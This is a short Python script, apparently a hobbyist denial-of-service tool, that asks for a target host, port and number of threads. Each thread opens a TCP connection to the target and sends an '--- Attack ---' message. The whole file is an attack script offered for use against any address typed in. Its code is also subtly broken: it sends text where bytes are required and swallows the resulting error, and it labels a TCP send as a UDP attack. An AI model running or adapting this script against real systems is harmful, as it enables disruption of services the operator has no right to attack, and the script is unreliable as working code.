import threading
import concurrent.futures
import socket

import time
from datetime import datetime


class DoS:
    def __init__(self, host, port, nThreads):
        self.host = host
        self.port = port

        self.nThreads = nThreads
        self.threads = []

        self.message = "--- Attack ---"

    def Zombie(self):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            s.connect((self.host, self.port))
            s.send(self.message)  # TCP Attack
            s.sendto(self.message, (self.host, self.port))  # UDP Attack
        except:
            print("err")
            pass

        s.close()

    def Attack(self):
        for _ in range(self.nThreads):
            t = threading.Thread(target=self.Zombie)
            self.threads.append(t)

        for i in self.threads:
            i.start()

        for i in self.threads:
            i.join()
        # with concurrent.futures.ThreadPoolExecutor() as executer:


if __name__ == "__main__":
    host = input("[*] Enter Target Host Address: ")
    port = int(input("[*] Enter Target Port to Attack: "))
    threads = int(input("[*] Enter number of Attacks: "))

    DoS = DoS(host, port, threads)

    print("\nHost %s" % (host))
    print("\n\n[*] Starting The Attack At %s..." % (time.strftime("%H:%M:%S")))
    start_time = datetime.now()

    DoS.Attack()

    end_time = datetime.now()
    total_time = end_time - start_time

    print("\n[*] The Attack Was Done At %s..." % (time.strftime("%H:%M:%S")))
    print("[*] Total Attack Time %s..." % (total_time))